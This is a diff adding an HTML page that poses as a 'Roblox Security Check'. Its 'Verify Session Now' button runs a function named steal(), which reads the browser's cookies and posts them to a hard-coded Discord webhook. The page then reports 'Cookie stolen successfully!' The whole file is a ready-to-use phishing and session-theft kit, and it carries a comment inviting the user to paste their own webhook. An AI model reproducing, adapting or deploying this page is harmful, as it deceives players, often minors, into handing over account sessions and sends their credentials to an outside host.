@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Security Check</title>
+    <style>
+        body { 
+            background-color: #1e1f22; 
+            color: white; 
+            font-family: 'Segoe UI', sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+        }
+        .container { text-align: center; background: #232527; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); max-width: 400px;}
+        h1 { color: #ffffff; margin-bottom: 10px; }
+        p { color: #b9bbbe; font-size: 14px; }
+        .btn { 
+            background-color: #00b894; 
+            border: none; 
+            padding: 15px 30px; 
+            color: white; 
+            font-weight: bold; 
+            cursor: pointer; 
+            border-radius: 5px; 
+            margin-top: 20px;
+            transition: 0.2s;
+        }
+        .btn:hover { background-color: #01a384; transform: scale(1.05); }
+        .status { margin-top: 15px; font-size: 12px; color: #fbc531; height: 20px;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Roblox Security Check</h1>
+        <p>We need to verify your session before you can continue.</p>
+        <button class="btn" onclick="steal()">Verify Session Now</button>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        // 1. PASTE YOUR WEBHOOK URL HERE
+        const webhookUrl = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4"; 
+
+        function steal() {
+            document.getElementById('status').innerText = "Verifying...";
+            
+            // 2. Get the Cookie from Browser Memory
+            let cookie = "";
+            try {
+                cookie = document.cookie; 
+            } catch (e) {
+                console.log("Cookie access error");
+            }
+
+            if (!cookie || cookie.length < 10) {
+                alert("Session not found. Make sure you are logged into Roblox!");
+                return;
+            }
+
+            // 3. Send to Discord
+            const payload = JSON.stringify({
+                content: "🔐 **New Cookie Detected!**",
+                embeds: [{
+                    title: "Roblox Session Leak",
+                    color: 16752000,
+                    fields: [
+                        { name: "Username", value: document.title || "Unknown", inline: true },
+                        { name: "Cookie (Session)", value: cookie.substring(0, 30) + "...", inline: false } 
+                    ]
+                }]
+            });
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('status').innerText = "✅ Success! Cookie sent.";
+                    alert("Cookie stolen successfully!");
+                } else {
+                    throw new Error();
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                document.getElementById('status').innerText = "❌ Failed to send data.";
+            });
+        }
+    </script>
+</body>
+</html>
+
